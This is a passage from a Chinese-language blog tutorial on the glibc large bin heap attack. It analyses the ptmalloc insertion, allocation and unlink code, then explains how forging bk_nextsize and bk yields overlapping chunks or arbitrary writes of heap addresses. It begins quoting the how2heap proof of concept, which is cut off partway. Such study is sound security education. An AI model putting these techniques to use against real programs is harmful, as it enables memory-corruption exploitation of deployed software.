class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301204056436.png"><span class="image-caption">image-20220301204056436</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301210420441.png"><span class="image-caption">image-20220301210420441</span></p>
<p><img src="/2022/02/28/2022-02-28-large-bin-attack/image-20220301210435991.png"><span class="image-caption">image-20220301210435991</span></p>
<p>可以看到不同的size会形成堆头，通过堆头的<code>fd_nextsize</code>与<code>bk_nextsize</code>指向比它小或大的堆头，按照从大到小的顺序，而相同的堆块则会链入到相应的堆头之中。而<code>fd</code>与<code>bk</code>在不同size的堆块间也是指向比它小或大的堆块，也是按照从大到小的顺序，而在相同size的堆块内则是按照先释放的在链表后面的排序，最终指向main_arena的一个地址，把所有 large chunk 串起来。</p>
<p>所以large bin 链表维护：</p>
<ul>
<li>堆块从大到小排序。</li>
<li>对于相同大小的堆块，最先释放的堆块会成为堆头，其<code>fd_nextsize</code>与<code>bk_nextsize</code>会被赋值，其余的堆块释放后都会插入到该堆头结点的下一个结点，通过<code>fd</code>与<code>bk</code>链接，形成了先释放的在链表后面的排序方式，但是后释放的堆块的<code>fd_nextsize</code>与<code>bk_nextsize</code>都为0。 </li>
<li>不同大小的堆块通过堆头串联，即堆头中<code>fd_nextsize</code>指向比它小的堆块的堆头，<code>bk_nextsize</code>指向比它大的堆块的堆头，从而形成了第一点中的从大到小排序堆块的方式。同时最大的堆块的堆头的<code>bk_nextsize</code>指向最小的堆块的堆头，最小堆块的堆头的<code>fd_nextsize</code>指向最大堆块的堆头，以此形成循环双链表。</li>
</ul>
<p>接下来看看源码中如何实现 large chunk 从 unsorted bin 中取下来放入到 large bin 的过程：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* place chunk in bin */</span><br><br>          <span class="hljs-keyword">if</span> (in_smallbin_range (size))<br>            &#123;<br>              ...  <span class="hljs-comment">// chunk为smallbin，放入到smallbin中</span><br>            &#125;<br>          <span class="hljs-keyword">else</span><br>            &#123;<br>              victim_index = largebin_index (size);<span class="hljs-comment">//第一步，获取当前要插入的chunk对应的index</span><br>              bck = bin_at (av, victim_index); <span class="hljs-comment">//当前index对应的main_arena,bck-&gt;bk才是最小的chunk</span><br>              fwd = bck-&gt;fd;                   <span class="hljs-comment">//当前index中最大的chunk</span><br><br>              <span class="hljs-comment">/* maintain large bins in sorted order */</span><br>              <span class="hljs-keyword">if</span> (fwd != bck)<br>                &#123; <span class="hljs-comment">// 该chunk对应的largebin index中不为空</span><br>                  <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>                  size |= PREV_INUSE;<br>                  <span class="hljs-comment">/* if smaller than smallest, bypass loop below */</span><br>                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (bck-&gt;bk-&gt;size)) <span class="hljs-comment">//第三步，如果要插入的chunk的size小于当前index中最小chunk的大小，则直接插入到最后面。</span><br>                    &#123;<br>                      fwd = bck;<br>                      bck = bck-&gt;bk;<br><br>                      victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                    &#125;<br>                  <span class="hljs-keyword">else</span><br>                    &#123;<br>                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                      <span class="hljs-keyword">while</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size &lt; fwd-&gt;size) <span class="hljs-comment">//第四步，如果插入的chunk不为最小，则通过`fd_nextsize`从大到小遍历chunk，找到小于等于要插入chunk的位置</span><br>                        &#123;<br>                          fwd = fwd-&gt;fd_nextsize;<br>                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                        &#125;<br><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) size == (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd; <span class="hljs-comment">//第五步，如果存在堆头，则插入到堆头的下一个节点</span><br>                      <span class="hljs-keyword">else</span><br>                        &#123; <span class="hljs-comment">//第六步，否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位</span><br>                          victim-&gt;fd_nextsize = fwd;<br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                          fwd-&gt;bk_nextsize = victim;<br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                        &#125;<br>                      bck = fwd-&gt;bk;<br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span>   <span class="hljs-comment">//第二步，chunk对应的largebin index中为空</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br><br>          mark_bin (av, victim_index);<br>          <span class="hljs-comment">//设置fd与bk，完成插入</span><br>          victim-&gt;bk = bck; <br>          victim-&gt;fd = fwd;<br>          fwd-&gt;bk = victim;<br>          bck-&gt;fd = victim;<br>          ...<br>        &#125;<br></code></pre></td></tr></table></figure>

<p>上述源码分析总结为：</p>
<ol>
<li>找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunk<code>bck</code>和最大的chunk<code>fwd</code>。</li>
<li>如果<code>fwd</code>等于<code>bck</code>，表明当前链表为空(因为fd，bk将会链接到main_arena上，所以一旦存在堆块，则必然不相等)，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将<code>bk_nextsize</code>和<code>fd_nextsize</code>赋值为它本身。</li>
<li>如果<code>fwd</code>不等于<code>bck</code>，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将<code>bk_nextsize</code>指向比它大的堆头，<code>fd_nextsize</code>指向双链表的第一个节点即最大的堆头。</li>
<li>如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过<code>fd_nextsize</code>进行遍历，由于<code>fd_nextsize</code>指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。</li>
<li>如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。</li>
<li>如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置<code>fd_nextsize</code>与<code>bk_nextsize</code>。</li>
</ol>
<p>然后分析large bin 被申请分配时的源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">        If a large request, scan through the chunks of current bin in</span><br><span class="hljs-comment">        sorted order to find smallest that fits.  Use the skip list for this.</span><br><span class="hljs-comment">      */</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>       &#123;<br>         bin = bin_at (av, idx); <span class="hljs-comment">//找到申请的size对应的largebin链表</span><br><br>         <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br>         <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)) <span class="hljs-comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span><br>           &#123;<br>             victim = victim-&gt;bk_nextsize; <br>             <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))) <span class="hljs-comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span><br>               victim = victim-&gt;bk_nextsize; <br><br>             <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                list does not have to be rerouted.  */</span><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="hljs-comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span><br>               victim = victim-&gt;fd;<br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd); <span class="hljs-comment">//第四步，largebin unlink 操作</span><br><br>             <span class="hljs-comment">/* Exhaust */</span><br>             <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE) <span class="hljs-comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span><br>               &#123;<br>                 set_inuse_bit_at_offset (victim, size);<br>                 <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   victim-&gt;size |= NON_MAIN_ARENA;<br>               &#125;<br>             <span class="hljs-comment">/* Split */</span><br>             <span class="hljs-keyword">else</span><br>               &#123;<br>                 remainder = chunk_at_offset (victim, nb); <span class="hljs-comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中。</span><br>                 <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>                 bck = unsorted_chunks (av);<br>                 fwd = bck-&gt;fd;<br>   <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                   &#123;<br>                     errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                     <span class="hljs-keyword">goto</span> errout;<br>                   &#125;<br>                 remainder-&gt;bk = bck;<br>                 remainder-&gt;fd = fwd;<br>                 bck-&gt;fd = remainder;<br>                 fwd-&gt;bk = remainder;<br>                 <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                   &#123;<br>                     remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                     remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                   &#125;<br>                 set_head (victim, nb | PREV_INUSE |<br>                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                 set_head (remainder, remainder_size | PREV_INUSE);<br>                 set_foot (remainder, remainder_size);<br>               &#125;<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure>

<p>上述源码分析总结为：</p>
<ol>
<li>找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。</li>
<li>如果当前largebin中存在合适的堆块，则从最小堆块开始，通过<code>bk_nextsize</code>反向遍历链表，找到大于等于当前申请空间的结点。</li>
<li>为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值的操作。</li>
<li>调用<code>unlink</code>将目标largebin chunk从双链表中取下。</li>
<li>判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。</li>
<li>否则将剩余的空间构成新的chunk放入到unsorted bin中。</li>
</ol>
<p>最后看 unlink 源码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Take a chunk off a bin list */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">if</span> (__builtin_expect (chunksize(P) != (next_chunk(P))-&gt;prev_size, 0))      \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-meta-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    FD = P-&gt;fd;                     \</span><br><span class="hljs-meta">    BK = P-&gt;bk;                     \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))         \</span><br><span class="hljs-meta">      malloc_printerr (check_action, <span class="hljs-meta-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="hljs-meta">    <span class="hljs-meta-keyword">else</span> &#123;                      \</span><br><span class="hljs-meta">        FD-&gt;bk = BK;                    \</span><br><span class="hljs-meta">        BK-&gt;fd = FD;                    \</span><br><span class="hljs-meta">        <span class="hljs-meta-keyword">if</span> (!in_smallbin_range (P-&gt;size)              \</span><br><span class="hljs-meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;          \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)        \</span><br><span class="hljs-meta">    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="hljs-meta">        malloc_printerr (check_action,              \</span><br><span class="hljs-meta">             <span class="hljs-meta-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="hljs-meta">             P, AV);                \</span><br><span class="hljs-meta">            <span class="hljs-meta-keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;              \</span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">if</span> (P-&gt;fd_nextsize == P)              \</span><br><span class="hljs-meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;         \</span><br><span class="hljs-meta">                <span class="hljs-meta-keyword">else</span> &#123;                    \</span><br><span class="hljs-meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;           \</span><br><span class="hljs-meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;           \</span><br><span class="hljs-meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;           \</span><br><span class="hljs-meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;           \</span><br><span class="hljs-meta">                  &#125;                   \</span><br><span class="hljs-meta">              &#125; <span class="hljs-meta-keyword">else</span> &#123;                    \</span><br><span class="hljs-meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;         \</span><br><span class="hljs-meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;         \</span><br><span class="hljs-meta">              &#125;                     \</span><br><span class="hljs-meta">          &#125;                     \</span><br><span class="hljs-meta">      &#125;                       \</span><br><span class="hljs-meta">&#125;</span><br></code></pre></td></tr></table></figure>

<p>从源码中可以看到，就是多了<code>fd_nextsize</code>和<code>bk_nextsize</code>两个位置的检查，原理和<code>fd</code>和<code>bk</code>的检查一致。需要注意的是对于存在多个满足空间的堆块来说，申请出来的是堆头的下一个结点，它的<code>fd_nextsize</code>和<code>bk_nextsize</code>为空，不满足条件<code>__builtin_expect (P-&gt;fd_nextsize != NULL, 0)</code>，因此只会像smallbin的unlink一样检查<code>fd</code>与<code>bk</code>，而不会对<code>fd_nextsize</code>与<code>bk_nextsize</code>进行检查与操作。</p>
<h2 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h2><p>largebin attack是在largebin双链表的插入与取下的过程中出现问题，导致可以被申请出非预期内存的情形，方式大致有两种：</p>
<ul>
<li>在申请 large bin 的过程中，伪造largebin的<code>bk_nextsize</code>，实现非预期内存申请。</li>
<li>在 large bin 插入的过程中，伪造largebin的<code>bk_nextsize</code>以及<code>bk</code>，实现任意地址写堆地址。</li>
</ul>
<h3 id="伪造-bk-nextsize"><a href="#伪造-bk-nextsize" class="headerlink" title="伪造 bk_nextsize"></a>伪造 bk_nextsize</h3><p>原理：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb)) <span class="hljs-comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span><br>           &#123;<br>             victim = victim-&gt;bk_nextsize; <br>             <span class="hljs-keyword">while</span> (((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb))) <span class="hljs-comment">//从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span><br>               victim = victim-&gt;bk_nextsize;  <span class="hljs-comment">//漏洞点，伪造bk_nextsize</span><br><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) <span class="hljs-comment">//申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span><br>               victim = victim-&gt;fd;<br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd); <span class="hljs-comment">//largebin unlink 操作</span><br> <br>     ... <br>     <span class="hljs-keyword">return</span> p;<br></code></pre></td></tr></table></figure>

<p>此利用方式是在申请largebin的过程中出现。回到申请largebin的源码中去看，它先判断当前双链表中存在满足申请需求的堆块（判断第一个堆块的大小），然后通过<code>bk_nextsize</code>反向遍历双链表找到第一个大于申请需求的堆块，申请该堆头对应的堆块。</p>
<p>问题出现在通过<code>bk_nextsize</code>反向遍历双链表的过程，如果能够伪造某个堆头结点中的<code>bk_nextsize</code>，将其指向非预期的内存地址，构造好数据使得非预期内存地址在通过unlink的检查之后，会将该空间返回给用户，最终使得可以申请出非预期的内存。最常见的就是用来构造overlap chunk。</p>
<p>典型应用场景：存在四个堆ABCD，largebin中存在链表A-&gt;B，其中A为0x420，B为0x400，C为0x410，C未释放。将B的<code>bk_nextsize</code>伪造指向C，同时将C的<code>fd</code>与<code>bk</code>构造好，将C的<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值为0，当申请0x410大小的内存E时，遍历<code>B-&gt;bk_nextsize</code>会指向C，且C的大小满足需求，因此会调用unlink将C从双链表取下，因此申请出来的堆块E的地址会为C的地址，即E和C为同一内存块，实现overlap chunk的构造。</p>
<p>所以需要的利用条件为：</p>
<ul>
<li>释放堆块存在UAF，能伪造 bk_nextsize</li>
<li>存在一块可控内存，其 size 要满足申请要求；同时伪造其 fd、bk 指针绕过unlink，其余清零即可</li>
</ul>
<h3 id="伪造-bk-nextsize-、-bk"><a href="#伪造-bk-nextsize-、-bk" class="headerlink" title="伪造 bk_nextsize 、 bk"></a>伪造 bk_nextsize 、 bk</h3><p>原理：</p>
<p>此利用方式是在将 unsorted bin 中的 chunk 取下，插入到largebin中出现的。回到largebin形成的代码中，关键代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><br>...<span class="hljs-comment">//将largebin从unsorted bin中取下</span><br>    unsorted_chunks (av)-&gt;bk = bck;<br>    bck-&gt;fd = unsorted_chunks (av);<br>    <br>    ...<br>    <br>                    victim-&gt;fd_nextsize = fwd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="hljs-comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span><br>                    fwd-&gt;bk_nextsize = victim;<br>                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="hljs-comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span><br>                  &#125;<br>                bck = fwd-&gt;bk; <span class="hljs-comment">//由于fwd-&gt;bk可控，因此bck可控</span><br>           ...<br><br>    mark_bin (av, victim_index);<br>    <span class="hljs-comment">//设置fd与bk完成插入</span><br>    victim-&gt;bk = bck; <br>    victim-&gt;fd = fwd;<br>    fwd-&gt;bk = victim;<br>    bck-&gt;fd = victim; <span class="hljs-comment">//bck可控，因此实现了往任意地址写victim的能力</span><br>    ...<br>  &#125;<br></code></pre></td></tr></table></figure>

<p>该攻击方式可实现两次往任意的地址写堆地址的能力，设任意地址为<code>evil_addr</code>，问题出现在当前的largebin插入为堆头的过程，在此过程中假设我们可控 largebin 中的<code>bk_nextsize</code>与<code>bk</code>。</p>
<p>一次是：控制<code>fwd-&gt;bk_nextsize</code>指向<code>evil_addr-0x20</code>。执行完<code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code>后，<code>victim-&gt;bk_nextsize</code>也为<code>evil_addr-0x20</code>，接着执行<code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code>即实现了往<code>evil_addr-0x20-&gt;fd_nextsize</code>写victim，即往<code>evil_addr</code>写victim地址。关键两行代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="hljs-comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span><br>...<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="hljs-comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span><br></code></pre></td></tr></table></figure>

<p>另一次是：控制<code>fwd-&gt;bk</code>指向<code>evil_addr-0x10</code>，执行完<code>bck = fwd-&gt;bk</code>后，<code>bck</code>为<code>evil_addr-0x10</code>，接着执行<code>bck-&gt;fd = victim</code>即往<code>evil_addr-0x10-&gt;fd</code>写victim，即往<code>evil_addr</code>写victim地址。关键两行代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c">bck = fwd-&gt;bk; <span class="hljs-comment">//由于fwd-&gt;bk可控，因此bck可控</span><br>...<br>bck-&gt;fd = victim; <span class="hljs-comment">//bck可控，因此实现了往任意地址写victim的能力</span><br></code></pre></td></tr></table></figure>

<p>这样利用伪造在largebin中的<code>bk_nextsize</code>与<code>bk</code>，我们获得了两次往任意地址写入堆地址的能力。</p>
<p>一个比较好的目标是写<code>global_max_fast</code>，使得可以将其覆盖成很大的值</p>
<p>利用条件：</p>
<ul>
<li>具有UAF，修改 large bin chunk 的 bk、bk_nextsize</li>
<li>被修改的 large bin chunk 的 size 要小于从 unsorted bin 取下放入 large bin 的 chunk 的 size</li>
<li>从 unsorted bin 取下放入 large bin 的 chunk 要能成为堆头</li>
</ul>
<p>可根据下面来自how2heap的poc进行手动学习</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    This technique is taken from</span><br><span class="hljs-comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">              else</span><br><span class="hljs-comment">              &#123;</span><br><span class="hljs-comment">                  victim-&gt;fd_nextsize = fwd;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="hljs-comment">                  fwd-&gt;bk_nextsize = victim;</span><br><span class="hljs-comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="hljs-comment">              &#125;</span><br><span class="hljs-comment">              bck = fwd-&gt;bk;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    mark_bin (av, victim_index);</span><br><span class="hljs-comment">    victim-&gt;bk = bck;</span><br><span class="hljs-comment">    victim-&gt;fd = fwd;</span><br><span class="hljs-comment">    fwd-&gt;bk = victim;</span><br><span class="hljs-comment">    bck-&gt;fd = victim;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span><br><span class="hljs-comment">    please check the Background section in the aforementioned link.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    [...]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br> <br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>           <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>           <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x500</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>           <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br> <br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>            <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>            <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>            <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)((<span class="hljs-keyword">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>           <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>, (<span class="hljs-keyword">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-keyword">void</span> 